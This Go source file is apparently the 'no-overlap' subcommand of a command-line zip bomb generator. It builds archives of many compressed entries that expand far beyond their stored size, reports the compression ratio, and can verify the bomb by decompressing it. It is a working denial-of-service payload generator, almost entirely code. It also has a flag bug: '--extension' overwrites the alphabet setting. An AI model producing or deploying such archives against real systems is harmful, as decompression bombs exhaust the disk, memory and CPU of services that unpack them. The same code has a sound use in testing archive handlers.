package cmd

import (
	"archive/zip"
	"bytes"
	"fmt"
	"io"
	"os"
	"time"

	"github.com/hupe1980/zipbomb/pkg/filename"
	"github.com/hupe1980/zipbomb/pkg/zipbomb"
	"github.com/spf13/cobra"
	"github.com/vbauerster/mpb/v8"
	"github.com/vbauerster/mpb/v8/decor"
)

type noOverlapOptions struct {
	numFiles         int
	alphabet         string
	extension        string
	verify           bool
	kernelBytes      []byte
	kernelRepeats    int
	compressionLevel int
}

func newNoOverlapCmd(rootOpts *rootOptions) *cobra.Command {
	opts := &noOverlapOptions{}
	cmd := &cobra.Command{
		Use:           "no-overlap",
		Short:         "Create non-recursive no-overlap zipbomb",
		SilenceUsage:  true,
		SilenceErrors: true,
		RunE: func(cmd *cobra.Command, args []string) error {
			creatingStart := time.Now()

			p := mpb.New(mpb.ContainerOptional(mpb.WithOutput(os.Stderr), true))

			archive, err := os.Create(rootOpts.output)
			if err != nil {
				return err
			}

			defer archive.Close()

			name := fmt.Sprintf("[i] Creating %s", archive.Name())
			bar := p.AddBar(int64(opts.numFiles),
				mpb.PrependDecorators(
					decor.Name(name, decor.WC{W: len(name) + 1, C: decor.DidentRight}),
					decor.OnComplete(decor.AverageETA(decor.ET_STYLE_GO, decor.WC{W: 4}), "done"),
				),
				mpb.AppendDecorators(decor.Percentage()),
			)

			zbomb, err := zipbomb.New(archive)
			if err != nil {
				return err
			}

			kb := bytes.Repeat(opts.kernelBytes, opts.kernelRepeats)

			if err = zbomb.AddNoOverlap(kb, opts.numFiles, func(o *zipbomb.AddOptions) {
				o.FilenameGen = filename.NewDefaultGenerator([]byte(opts.alphabet), opts.extension)
				o.CompressionLevel = opts.compressionLevel
				o.Method = zipbomb.Deflate
				o.OnFileCreateHook = func(name string) {
					bar.Increment()
				}
			}); err != nil {
				return err
			}

			if err = zbomb.Close(); err != nil {
				return err
			}

			p.Wait()

			finfo, err := os.Stat(archive.Name())
			if err != nil {
				return err
			}

			creatingEnd := time.Now()

			emptyLine()
			printInfof("Archive: %s", archive.Name())
			printInfof("Zip64: %t", zbomb.IsZip64())
			printInfof("Comcompressed size: %d %s", finfo.Size()/1024, "KB")
			printInfof("Uncomcompressed size: %d %s", zbomb.UncompressedSize()/(1024*1024), "MB")
			printInfof("Ratio: %.2f", float64(zbomb.UncompressedSize())/float64(finfo.Size()))
			printInfof("Creating time elapsed: %s\n", creatingEnd.Sub(creatingStart))

			if opts.verify {
				verifyingStart := time.Now()

				p := mpb.New(mpb.ContainerOptional(mpb.WithOutput(os.Stderr), true))

				r, err := zip.OpenReader(archive.Name())
				if err != nil {
					return err
				}

				name := fmt.Sprintf("[i] Verifying %s", archive.Name())
				bar := p.AddBar(int64(len(r.File)),
					mpb.PrependDecorators(
						decor.Name(name, decor.WC{W: len(name) + 1, C: decor.DidentRight}),
						decor.OnComplete(decor.AverageETA(decor.ET_STYLE_GO, decor.WC{W: 4}), "done"),
					),
					mpb.AppendDecorators(decor.Percentage()),
				)

				for _, file := range r.File {
					fr, err := file.Open()
					if err != nil {
						return err
					}

					for {
						_, err := io.CopyN(io.Discard, fr, 1024)
						if err != nil {
							if err == io.EOF {
								break
							}
							return err
						}
					}

					fr.Close()

					bar.Increment()
				}

				p.Wait()

				verifyingEnd := time.Now()

				emptyLine()
				printInfof("Zip bomb verified!")
				printInfof("Verifying time elapsed: %s\n", verifyingEnd.Sub(verifyingStart))
			}

			return nil
		},
	}

	cmd.Flags().IntVarP(&opts.numFiles, "num-files", "N", 100, "number of files")
	cmd.Flags().StringVarP(&opts.alphabet, "alphabet", "", string(filename.DefaultAlphabet), "alphabet for generating filenames")
	cmd.Flags().StringVarP(&opts.alphabet, "extension", "", "", "extension for generating filenames")
	cmd.Flags().BoolVarP(&opts.verify, "verify", "", false, "verify zip archive")
	cmd.Flags().BytesHexVarP(&opts.kernelBytes, "kernel-bytes", "B", []byte{'B'}, "kernel bytes")
	cmd.Flags().IntVarP(&opts.kernelRepeats, "kernel-repeats", "R", 1024*1024, "kernel repeats")
	cmd.Flags().IntVarP(&opts.compressionLevel, "compression-level", "L", 5, "compression-level [-2, 9]")

	return cmd
}
